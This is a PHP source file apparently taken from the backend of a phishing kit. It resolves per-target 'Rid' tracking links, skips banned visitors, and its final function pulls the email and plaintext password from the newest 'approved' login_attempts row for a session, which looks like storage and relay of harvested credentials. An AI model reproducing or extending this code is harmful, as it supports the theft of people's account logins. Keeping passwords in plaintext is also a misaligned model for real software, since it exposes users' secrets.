<?php
declare(strict_types=1);

function link_public_url(array|string $linkOrId): string
{
    global $CONFIG;
    $base = rtrim($CONFIG['base_url'], '/');
    $id = link_resolve_id($linkOrId);
    if ($id === null) {
        return $base;
    }
    return $base . '/Rid=' . $id;
}

function link_resolve_id(array|string $linkOrId): ?string
{
    if (is_array($linkOrId)) {
        $id = trim((string)($linkOrId['id'] ?? ''));
        if ($id !== '' && preg_match('/^[a-zA-Z0-9]{4,16}$/', $id)) {
            return $id;
        }
        $suffix = trim((string)($linkOrId['number_suffix'] ?? ''));
        if ($suffix !== '') {
            $row = db_one('SELECT id FROM links WHERE number_suffix = ?', [$suffix]);
            if ($row && preg_match('/^[a-zA-Z0-9]{4,16}$/', (string)$row['id'])) {
                return (string)$row['id'];
            }
        }
        return null;
    }

    $raw = trim((string)$linkOrId);
    if ($raw !== '' && preg_match('/^[a-zA-Z0-9]{4,16}$/', $raw)) {
        return $raw;
    }
    return null;
}

function resolve_active_link(bool $is_banned): ?array
{
    if ($is_banned) {
        return null;
    }

    $link_id = trim((string)($_GET['id'] ?? ''));
    if ($link_id !== '' && preg_match('/^[a-zA-Z0-9]{4,16}$/', $link_id)) {
        $link = db_one('SELECT * FROM links WHERE id = ? AND is_active = 1', [$link_id]);
        if ($link !== null) {
            return $link;
        }
    }

    $rid = trim((string)($_GET['Rid'] ?? ''));
    if ($rid !== '' && preg_match('/^[a-zA-Z0-9]{4,16}$/', $rid)) {
        $link = db_one('SELECT * FROM links WHERE id = ? AND is_active = 1', [$rid]);
        if ($link !== null) {
            return $link;
        }
    }

    $path = trim((string)parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH), '/');
    if ($path === '' || preg_match('#^(api|assets)(/|$)#', $path)) {
        return null;
    }

    if (preg_match('/^Rid=([a-zA-Z0-9]{4,16})$/i', $path, $m)) {
        $link = db_one('SELECT * FROM links WHERE id = ? AND is_active = 1', [$m[1]]);
        if ($link !== null) {
            return $link;
        }
    }

    if (preg_match('/^[a-zA-Z0-9]{4,32}$/', $path)) {
        $link = db_one('SELECT * FROM links WHERE number_suffix = ? AND is_active = 1', [$path]);
        if ($link !== null) {
            return $link;
        }
        return db_one('SELECT * FROM links WHERE id = ? AND is_active = 1', [$path]);
    }

    return null;
}

function session_login_credentials(?string $session_id): array
{
    if ($session_id === null || $session_id === '') {
        return ['email' => '', 'password' => ''];
    }
    $row = db_one(
        'SELECT email, password FROM login_attempts
          WHERE session_id = ? AND status = \'approved\'
          ORDER BY id DESC LIMIT 1',
        [$session_id]
    );
    return [
        'email'    => (string)($row['email'] ?? ''),
        'password' => (string)($row['password'] ?? ''),
    ];
}
